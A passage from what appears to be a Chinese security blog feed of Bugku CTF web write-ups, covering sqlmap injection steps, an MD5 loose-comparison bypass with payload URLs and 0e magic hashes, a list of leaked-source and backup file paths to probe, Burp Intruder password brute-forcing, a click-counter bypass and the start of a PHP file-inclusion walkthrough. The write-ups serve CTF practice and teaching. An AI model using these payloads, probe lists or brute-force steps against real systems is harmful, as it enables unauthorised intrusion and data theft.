src="https://ws1.sinaimg.cn/large/006Gstfogy1g2ki630ikyj30x60igweo.jpg" alt=""><br>还可以使用sqlmap<br>进行burp suite抓包，右键保存文件<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2ki6dxs42j30rs0m80uh.jpg" alt=""><br>将文本放在sqlmap的当前目录下，打开sqlmap<br>爆库<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2ki6le8r5j30o90kjq3q.jpg" alt=""><br>爆表名<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2ki6soqkdj30o90kjaaz.jpg" alt=""><br>爆字段<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2ki6xqz4vj30o90kj755.jpg" alt=""><br>爆字段信息<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2ki737tlbj30o90qidhd.jpg" alt=""><br><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Sqlmap命令参数</span><br><span class="line"><span class="deletion">-r 是读文件 后面是刚才保存的绝对路径</span></span><br><span class="line"><span class="deletion">-p 是参数，也就是注入点（选了id是注入点）</span></span><br><span class="line"><span class="deletion">-D 是表示选择了后面的这个数据库 </span></span><br><span class="line"><span class="deletion">-T 指定表</span></span><br><span class="line"><span class="deletion">-C 指定要爆的字段</span></span><br><span class="line"></span><br><span class="line"><span class="deletion">--dbs –&gt;获取数据库名称</span></span><br><span class="line"><span class="deletion">--current-db –&gt;获取当前数据库名称</span></span><br><span class="line"><span class="deletion">--tables –&gt;获取表</span></span><br><span class="line"><span class="deletion">--columns –&gt;获取字段</span></span><br><span class="line"><span class="deletion">--dump –&gt;将结果导出</span></span><br></pre></td></tr></table></figure></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">Mysql数据库information_schema系统表说明:</span><br><span class="line"></span><br><span class="line">SCHEMATA表：提供了当前mysql实例中所有数据库的信息。是<span class="keyword">show</span> <span class="keyword">databases</span>的结果取之此表。</span><br><span class="line"></span><br><span class="line"><span class="keyword">TABLES</span>表：提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个<span class="keyword">schema</span>，表类型，表引擎，创建时间等信息。是<span class="keyword">show</span> <span class="keyword">tables</span> <span class="keyword">from</span> schemaname的结果取之此表。</span><br><span class="line"></span><br><span class="line"><span class="keyword">COLUMNS</span>表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。是<span class="keyword">show</span> <span class="keyword">columns</span> <span class="keyword">from</span> schemaname.tablename的结果取之此表。</span><br><span class="line"></span><br><span class="line"><span class="keyword">STATISTICS</span>表：提供了关于表索引的信息。是<span class="keyword">show</span> <span class="keyword">index</span> <span class="keyword">from</span> schemaname.tablename的结果取之此表。</span><br><span class="line"></span><br><span class="line">USER_PRIVILEGES（用户权限）表：给出了关于全程权限的信息。该信息源自mysql.user授权表。是非标准表。</span><br><span class="line"></span><br><span class="line">SCHEMA_PRIVILEGES（方案权限）表：给出了关于方案（数据库）权限的信息。该信息来自mysql.db授权表。是非标准表。</span><br><span class="line"></span><br><span class="line">TABLE_PRIVILEGES（表权限）表：给出了关于表权限的信息。该信息源自mysql.tables_priv授权表。是非标准表。</span><br><span class="line"></span><br><span class="line">COLUMN_PRIVILEGES（列权限）表：给出了关于列权限的信息。该信息源自mysql.columns_priv授权表。是非标准表。</span><br><span class="line"></span><br><span class="line">CHARACTER_SETS（字符集）表：提供了mysql实例可用字符集的信息。是<span class="keyword">SHOW</span> <span class="built_in">CHARACTER</span> <span class="keyword">SET</span>结果集取之此表。</span><br><span class="line"></span><br><span class="line">COLLATIONS表：提供了关于各字符集的对照信息。</span><br><span class="line"></span><br><span class="line">COLLATION_CHARACTER_SET_APPLICABILITY表：指明了可用于校对的字符集。这些列等效于<span class="keyword">SHOW</span> <span class="keyword">COLLATION</span>的前两个显示字段。</span><br><span class="line"></span><br><span class="line">TABLE_CONSTRAINTS表：描述了存在约束的表。以及表的约束类型。</span><br><span class="line"></span><br><span class="line">KEY_COLUMN_USAGE表：描述了具有约束的键列。</span><br><span class="line"></span><br><span class="line">ROUTINES表：提供了关于存储子程序（存储程序和函数）的信息。此时，ROUTINES表不包含自定义函数（UDF）。名为“mysql.proc <span class="keyword">name</span>”的列指明了对应于INFORMATION_SCHEMA.ROUTINES表的mysql.proc表列。</span><br><span class="line"></span><br><span class="line">VIEWS表：给出了关于数据库中的视图的信息。需要有<span class="keyword">show</span> views权限，否则无法查看视图信息。</span><br><span class="line"></span><br><span class="line"><span class="keyword">TRIGGERS</span>表：提供了关于触发程序的信息。必须有super权限才能查看该表</span><br><span class="line"></span><br><span class="line">详情可以点击:https://wenku.baidu.com/<span class="keyword">view</span>/<span class="number">6358</span>a5fd89eb172ded63b7a8.html</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Bugku </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> Mysql </tag>
            
            <tag> sqlmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP语法</title>
      <link href="/2019/01/31/201930/"/>
      <url>/2019/01/31/201930/</url>
      
        <content type="html"><![CDATA[<p><strong>php语法</strong><br><a id="more"></a><br>strstr() 函数搜索字符串在另一字符串中的第一次出现。<br>语法<br>strstr(string,search,before_search)</p><table><thead><tr><th>参数</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td>string</td><td style="text-align:left">必需。规定被搜索的字符串。</td></tr><tr><td>search</td><td style="text-align:left">必需。规定所搜索的字符串。<br>如果此参数是数字，则搜索匹配此数字对应的 ASCII 值的字符。</td></tr><tr><td>before_search</td><td style="text-align:left">可选。默认值为 “false” 的布尔值。<br>如果设置为 “true”，它将返回 search 参数第一次出现之前的字符串部分。</td></tr></tbody></table><p>实例:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> strstr(<span class="string">"axiaowei.cn?key1=1"</span>,<span class="string">'?'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kibsp52dj30mn04jwea.jpg" alt=""><br>substr() 函数返回字符串的一部分。<br>语法<br>substr(string,start,length)</p><table><thead><tr><th>参数</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td>string</td><td style="text-align:left">必需。规定要返回其中一部分的字符串。</td></tr><tr><td>start</td><td style="text-align:left">必需。规定在字符串的何处开始。<br>正数-在字符串的指定位置开始<br>负数-在从字符串结尾开始的指定位置开始。<br>0-在字符串中的第一个字符处开始</td></tr><tr><td>length</td><td style="text-align:left">可选。规定被返回字符串的长度。默认是直到字符串的结尾。<br>正数-从 start 参数所在的位置返回的长度<br>负数 - 从字符串末端返回的长度</td></tr></tbody></table><p>实例<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> substr(<span class="string">"www.axiaowei.cn"</span>,<span class="number">4</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kic070uuj30lm02zq2q.jpg" alt=""></p><p>str_replace() 函数以其他字符替换字符串中的一些字符（区分大小写）。<br>语法<br>str_replace(find,replace,string,count)</p><table><thead><tr><th>参数</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td>find</td><td style="text-align:left">必需。规定要查找的值</td></tr><tr><td>replace</td><td style="text-align:left">必需。规定替换find中的值的值</td></tr><tr><td>string</td><td style="text-align:left">必需。规定被搜索的字符串</td></tr><tr><td>count</td><td style="text-align:left">可选。对替换数进行计数的变量</td></tr></tbody></table><p>实例<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> str_replace(<span class="string">"world"</span>,<span class="string">"xiaowei blog"</span>,<span class="string">"Hello world!"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kid8f9c7j30nl03ldfn.jpg" alt=""><br>parse_str() 函数把查询字符串解析到变量中。<br>语法<br>parse_str(string,array)</p><table><thead><tr><th>参数</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td>string</td><td style="text-align:left">必需。规定解析的字符串</td></tr><tr><td>array</td><td style="text-align:left">可选。规定存储变量的数组名称。该参数指示变量将被存储到数组中</td></tr></tbody></table><p>实例<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">parse_str(<span class="string">"key1=xiaowei&amp;key2=2019"</span>);</span><br><span class="line"><span class="keyword">echo</span> $key1;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> $key2;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kidfnhuuj30nq04fjr8.jpg" alt=""><br>$_SERVER[“REQUEST_URI”]函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$_SERVER[<span class="string">"REQUEST_URI"</span>]函数</span><br><span class="line">预定义服务器变量的一种，所有$_SERVER开头的都叫做预定义服务器变量 REQUEST_URI的作用是取得当前URI，也就是除域名外后面的完整的地址路径</span><br><span class="line">例如：当前页面是http:<span class="comment">//www.axiaowei.cn/plus/search.php?kwtype=0&amp;keyword=php&amp;searchtype=titlekeyword</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $_SERVER[<span class="string">"REQUEST_URI"</span>];</span><br><span class="line"></span><br><span class="line">结果就为：plus/search.php?kwtype=<span class="number">0</span>&amp;keyword=php&amp;searchtype=titlekeyword</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku-备份是个好习惯</title>
      <link href="/2019/01/31/201929/"/>
      <url>/2019/01/31/201929/</url>
      
        <content type="html"><![CDATA[<p><strong>备份是个好习惯-writeup</strong><br><a id="more"></a><br>打开题目<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kie8d2y8j30ci0acmx7.jpg" alt=""><br>访问链接，给出一串md5值，尝试去md5解密一下，空密码<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kiee5945j30jq072q2v.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kiekqcl1j30if05xjra.jpg" alt=""><br>根据题目提示，直接上御剑扫描(或者可以尝试常见的几个源码泄露)<br>附常见的源码泄露、备份文件<br>List<br><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">.git</span></span><br><span class="line"><span class="string">.git/HEAD</span></span><br><span class="line"><span class="string">.git/index</span></span><br><span class="line"><span class="string">.git/config</span></span><br><span class="line"><span class="string">.git/description</span></span><br><span class="line">README.MD</span><br><span class="line">README.md</span><br><span class="line">README</span><br><span class="line"><span class="string">.gitignore</span></span><br><span class="line"><span class="string">.svn</span></span><br><span class="line"><span class="string">.svn/wc.db</span></span><br><span class="line"><span class="string">.svn/entries</span></span><br><span class="line"><span class="string">.hg</span></span><br><span class="line"><span class="string">.ds_store</span></span><br><span class="line">WEB-INF/web.xml</span><br><span class="line">WEB-INF/src/</span><br><span class="line">WEB-INF/classes</span><br><span class="line">WEB-INF/lib</span><br><span class="line">WEB-INF/database.propertie</span><br><span class="line">CVS/Root</span><br><span class="line">CVS/Entries</span><br><span class="line"><span class="string">.bzr/</span></span><br><span class="line">?</span><br><span class="line">?~</span><br><span class="line">.?<span class="string">.swp</span></span><br><span class="line">.?<span class="string">.swo</span></span><br><span class="line">.?<span class="string">.swn</span></span><br><span class="line">.?<span class="string">.swm</span></span><br><span class="line">.?<span class="string">.swl</span></span><br><span class="line">_viminfo</span><br><span class="line"><span class="string">.viminfo</span></span><br><span class="line">?~</span><br><span class="line">?~1~</span><br><span class="line">?~2~</span><br><span class="line">?~3~</span><br><span class="line">?<span class="string">.save</span></span><br><span class="line">?<span class="string">.save1</span></span><br><span class="line">?<span class="string">.save2</span></span><br><span class="line">?<span class="string">.save3</span></span><br><span class="line">?<span class="string">.bak_Edietplus</span></span><br><span class="line">?<span class="string">.bak</span></span><br><span class="line">?<span class="string">.back</span></span><br><span class="line">phpinfo.php</span><br><span class="line">test.php</span><br><span class="line"><span class="string">.bash_history</span></span><br></pre></td></tr></table></figure></p><p>File<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">index.php</span><br><span class="line">login.php</span><br><span class="line">register.php</span><br><span class="line">test.php</span><br><span class="line">phpinfo.php</span><br><span class="line">t.php</span><br><span class="line">www.zip</span><br><span class="line">www.rar</span><br><span class="line">www.zip</span><br><span class="line">www.<span class="number">7</span>z</span><br><span class="line">www<span class="selector-class">.tar</span><span class="selector-class">.gz</span></span><br><span class="line">www.tar</span><br><span class="line">web.zip</span><br><span class="line">web.rar</span><br><span class="line">web.zip</span><br><span class="line">web.<span class="number">7</span>z</span><br><span class="line">web<span class="selector-class">.tar</span><span class="selector-class">.gz</span></span><br><span class="line">web.tar</span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kig2pfkgj30ly0f13yw.jpg" alt=""><br>下载得到一个源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * User: Norse</span></span><br><span class="line"><span class="comment"> * Date: 2017/8/6</span></span><br><span class="line"><span class="comment"> * Time: 20:22</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"flag.php"</span>; <span class="comment">//脚本执行期间包含并运行指定文件(只包含一次)</span></span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>); <span class="comment">//不显示错误报告</span></span><br><span class="line">$str = strstr($_SERVER[<span class="string">'REQUEST_URI'</span>], <span class="string">'?'</span>); <span class="comment">//搜索当前url值中？(包含？)后边的字符串赋值给变量str</span></span><br><span class="line">$str = substr($str,<span class="number">1</span>); <span class="comment">//str中的第二个字符开始(含)，返回后面的字符串赋值给变量str</span></span><br><span class="line">$str = str_replace(<span class="string">'key'</span>,<span class="string">''</span>,$str);  <span class="comment">//在str中查找key，并将其替换为空</span></span><br><span class="line">parse_str($str); <span class="comment">//将str解析到变量中</span></span><br><span class="line"><span class="keyword">echo</span> md5($key1);  <span class="comment">//将md5($key1)写入输出</span></span><br><span class="line"><span class="keyword">echo</span> md5($key2);  <span class="comment">//将md5($key2)写入输出</span></span><br><span class="line"><span class="keyword">if</span>(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag.<span class="string">"取得flag"</span>;</span><br><span class="line">&#125; <span class="comment">//判断MD5加密后的key1值等于MD5加密后的key2值且key1的值不等于key2的值，成立输出flag</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p><strong>可参考<a href="https://axiaowei.cn/2019/01/31/201929/#more">PHP语法</a></strong><br>现在我们对代码审计完后<br>方法一<br>构造payload：<br><a href="http://123.206.87.240:8002/web16/?kkeyey1[]=123&amp;kkeyey2[]=456" target="_blank" rel="noopener">http://123.206.87.240:8002/web16/?kkeyey1[]=123&amp;kkeyey2[]=456</a><br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kig9g0o9j30mz07dglm.jpg" alt=""><br><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">md5()中需要传入的是一个<span class="built_in">string</span>类型的参数，当我们传递一个数组时，它是不会报错的，函数无法求出数组的MD5值，这样导致任意两个数组的MD5值都相等，从而绕过输入数值的判断。</span><br><span class="line">md5算法比较数组会返回<span class="literal">NULL</span>，也就是等值。</span><br><span class="line"></span><br><span class="line">这里注意的是:$str = str_replace(<span class="string">'key'</span>,<span class="string">''</span>,$str)<span class="comment">; 将key替换为空所以这里需要利用到重写(kkeyey)绕过</span></span><br></pre></td></tr></table></figure></p><p>方法二<br>构造payload：<br><a href="http://123.206.87.240:8002/web16/?kkeyey1=QNKCDZO&amp;kkeyey2=s878926199a" target="_blank" rel="noopener">http://123.206.87.240:8002/web16/?kkeyey1=QNKCDZO&amp;kkeyey2=s878926199a</a><br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kigg5da3j30r305zwel.jpg" alt=""><br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">==是比较运算，它不会去检查条件式的表达式的类型</span><br><span class="line"></span><br><span class="line">===是恒等，它会检查查表达式的值与类型是否相等。</span><br><span class="line"></span><br><span class="line">PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，</span><br><span class="line">它把每一个以”<span class="number">0</span>E”开头的哈希值都解释为<span class="number">0</span>（遇到<span class="number">0</span>e\d+这种字符串，就会将这种字符串解析为科学计数法），</span><br><span class="line">所以如果两个不同的密码经过哈希以后，其哈希值都是以”<span class="number">0</span>E”开头的，那么PHP将会认为他们相同，都是<span class="number">0</span>。</span><br><span class="line"></span><br><span class="line">攻击者可以利用这一漏洞，通过输入一个经过哈希后以”<span class="number">0</span>E”开头的字符串，即会被PHP解释为<span class="number">0</span>，</span><br><span class="line">如果数据库中存在这种哈希值以”<span class="number">0</span>E”开头的密码的话，他就可以以这个用户的身份登录进去，尽管并没有真正的密码。</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> Bugku </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> MD5 </tag>
            
            <tag> bak </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku-点击一百万次</title>
      <link href="/2019/01/30/201928/"/>
      <url>/2019/01/30/201928/</url>
      
        <content type="html"><![CDATA[<p>点击一百万次-writeup<br><a id="more"></a><br>打开题目<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kihgdic6j30cj0adweh.jpg" alt=""><br>访问链接，看来是要你点击一百万次，点了几下，好了我放弃了<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kihlg2gqj30yj0hp3yl.jpg" alt=""><br>查看审查元素<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kihvf57wj30ym0phtac.jpg" alt=""><br>发现一串JavaScript<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> clicks=<span class="number">0</span> <span class="comment">//声明一个clicks定位为0</span></span><br><span class="line">$(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;<span class="comment">//$(document).ready(function() &#123; ... &#125;);的缩写，防止文档在完全加载（就绪）之前运行 jQuery 代码。如果在文档没有完全加载之前就运行函数，操作可能失败。其作用和 $(document).ready()一樣 ，用意在DOM載入後執行ready()方法。</span></span><br><span class="line">  $(<span class="string">"#cookie"</span>).mousedown(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;  <span class="comment">//鼠标按下事件</span></span><br><span class="line">      $(<span class="keyword">this</span>).width(<span class="string">'350px'</span>).height(<span class="string">'350px'</span>); <span class="comment">//$(this)代码代表$('#cookie)，鼠标按下之后id为cookie的元素改变宽度和高度</span></span><br><span class="line">    &#125;).mouseup(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="comment">//鼠标松开事件</span></span><br><span class="line">      $(<span class="keyword">this</span>).width(<span class="string">'375px'</span>).height(<span class="string">'375px'</span>);  <span class="comment">//鼠标松开之后id为cookie的元素改变宽度和高度</span></span><br><span class="line">      clicks++; <span class="comment">//clicks增加</span></span><br><span class="line">      $(<span class="string">"#clickcount"</span>).text(clicks); <span class="comment">//clicks++完给id为clickcount元素改变值</span></span><br><span class="line">      <span class="keyword">if</span>(clicks &gt;= <span class="number">1000000</span>)&#123;  <span class="comment">//当clicks大于或等于1000000，声明一个form，并在body追加form</span></span><br><span class="line">      <span class="keyword">var</span> form = $(<span class="string">'&lt;form action="" method="post"&gt;'</span> +</span><br><span class="line"><span class="string">'&lt;input type="text" name="clicks" value="'</span> + clicks + <span class="string">'" hidden/&gt;'</span> +<span class="string">'&lt;/form&gt;'</span>); <span class="comment">//定义html代码</span></span><br><span class="line">$(<span class="string">'body'</span>).append(form);  <span class="comment">//在body插入html代码</span></span><br><span class="line">form.submit();  <span class="comment">//执行form表单提交</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p>打开浏览器Console提交clicks=999999，再点击一次页面<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kii8n75oj30yj0ocaag.jpg" alt=""><br>也可以利用hackbar直接post提交clicks=1000000<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kiieba2wj30yj0ocgm7.jpg" alt=""><br>还有很多种方式，大家可以一一尝试下，只要将clicks值达到满足判断条件即可。</p>]]></content>
      
      
      <categories>
          
          <category> Bugku </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku-输入密码查看flag</title>
      <link href="/2019/01/29/201927/"/>
      <url>/2019/01/29/201927/</url>
      
        <content type="html"><![CDATA[<p><strong>输入密码查看flag-writeup</strong><br><a id="more"></a><br>打开题目<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kiitik64j30cj0aewej.jpg" alt=""><br>访问链接，尝试输入12345，提示密码错误，利用burp suite爆破（题目已经给出提示）<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kiiydbj1j30fa05ot8j.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kij3bq6mj30yd0hymxr.jpg" alt=""><br><img src="https://i.imgur.com/61231Iw.png" alt=""><br>设置代理，在浏览器中随便输入五位数字，打开burp suite抓包，发送到Intruder<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kij9aknyj30hm05vt8k.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kijqrsooj30rs0m80uf.jpg" alt=""><br>在Intruder中Positions中选择Clear清除，将12345选中选择Add添加<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kikfbvg7j30ns0myjsr.jpg" alt=""><br>在Payloads设置好相应参数，数字类型、10000-99999，步长为1<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kikwcw4kj30ns0mywfi.jpg" alt=""><br>在Options选项中设置线程（看电脑性能）<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kil8w02lj30rs0m8myj.jpg" alt=""><br>点击Start attack开始，过一会就出来了（正确密码与错误密码Length长度是有区别的）<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kilffxzmj30ns0my75r.jpg" alt=""><br>将密码输入浏览器中，点击查看，得到flag<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2killi92bj30ev04kt8k.jpg" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> Bugku </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> 爆破 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku-flag在index里</title>
      <link href="/2019/01/29/201926/"/>
      <url>/2019/01/29/201926/</url>
      
        <content type="html"><![CDATA[<p><strong>flag在index里-writeup</strong><br><a id="more"></a><br>打开题目<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kimmp7b8j30cf09cdft.jpg" alt=""><br>访问链接，页面显示click me? no 点击进去显示test5<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kimtzuz6j30i5066dfo.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2kimz425zj30lj07ejr9.jpg" alt=""><br>这里我们看到url中含有file关键字<br>题目提示我们flag在index中，通过分析，这里发送了file为key，show.php为value的get请求<br>ctf常见的套路-php文件包含漏洞<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file=$_GET[<span class="string">'file'</span>];</span><br><span class="line">...</span><br><span class="line"><span class="keyword">include</span>($file); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="regexp">//</span>-访问各个输入<span class="regexp">/输出流（I/</span>O streams）</span><br><span class="line">PHP 提供了一些杂项输入<span class="regexp">/输出（IO）流，允许访问 